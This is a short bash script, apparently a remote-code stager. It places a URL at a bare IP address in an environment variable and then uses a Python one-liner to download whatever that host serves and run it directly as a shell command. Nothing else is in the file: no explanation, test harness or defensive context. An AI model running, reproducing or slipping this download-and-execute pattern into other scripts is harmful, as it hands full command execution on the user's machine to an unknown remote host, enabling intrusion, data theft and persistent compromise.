#!/bin/bash
export P=http://185.243.5.7/s
python3 -c "import urllib.request,os;os.system(urllib.request.urlopen(os.environ['P']).read().decode())"
